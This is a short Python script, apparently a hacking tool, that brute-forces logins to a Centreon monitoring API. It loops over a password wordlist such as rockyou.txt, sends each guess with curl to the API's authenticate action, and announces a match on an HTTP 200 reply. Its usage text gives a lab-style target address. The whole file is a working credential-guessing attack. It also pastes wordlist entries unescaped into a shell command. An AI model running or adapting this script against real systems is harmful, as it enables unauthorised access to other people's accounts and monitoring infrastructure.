from subprocess import PIPE, Popen
import subprocess
import sys
import re

def cmdline(command):
    proc = subprocess.Popen(str(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    return err

def main():
    if len(sys.argv) < 3:
        print("Start Listener before start exploit")
        print("Curl is needed for this brute script to work!")
        print("Usage:\tcentreon_api_brute.py username password_list url")
        print("Ex:\tcentreon_api_brute.py admin /usr/share/wordlists/rockyou.txt 10.10.11.1/centreon/api/ ")
        sys.exit(0)
    else:
        username, password_list, url = sys.argv[1], sys.argv[2], sys.argv[3]
        words = [line.strip() for line in open(password_list)]
        print("\n")
        count=0
        for w in words:
            strcmd = 'curl -XPOST -v -d "username={}&password={}" {}?action=authenticate'.format(username, w, url)
            res=cmdline(strcmd)
            print(res)
            if re.findall('\\b'+'HTTP/1.1 200 OK'+'\\b', res):
                    print("\nLooks like we have a match! {}:{}".format(username, w))
                    sys.exit()
            print(str(count)+"/"+str(w))
            count=count+1
        print("\n")

if __name__ == '__main__':
    main()
